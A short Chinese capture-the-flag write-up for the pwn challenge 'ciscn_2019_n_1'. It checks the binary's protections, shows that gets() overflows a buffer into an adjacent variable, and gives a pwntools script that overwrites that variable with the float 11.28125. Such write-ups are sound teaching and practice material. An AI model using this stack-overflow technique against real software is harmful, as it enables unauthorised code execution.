首先检查一下保护机制

![image-20200521165649983](https://static.hack1s.fun/images/2021/02/06/image-20200521165649983.png)

同样只有NX

main函数中的设置了一个buf，之后调用了另一个func

![image-20200521203023180](https://static.hack1s.fun/images/2021/02/06/image-20200521203023180.png)

这个调用的func很神奇

![image-20200521203057408](https://static.hack1s.fun/images/2021/02/06/image-20200521203057408.png)

`gets`了一个v1

但是比较的却是v2的值，如果v2满足条件就可以执行

看到v1距离rbp有30h

v2距离rbp只有4h，因此首先要填补这之间的差值

之后加上一个float的值11.28125就可以了

这里python在计算float值时有点麻烦，不如直接在IDA里比对这个11.28125的二进制值

![image-20200521205842979](https://static.hack1s.fun/images/2021/02/06/image-20200521205842979.png)

exp也比较简单

```python
from pwn import *

io = process('./ciscn_2019_n_1')
payloads = 'a'*(0x30-0x4)+p32(0x41348000)

io.sendline(payloads)
io.interactive()
```



## 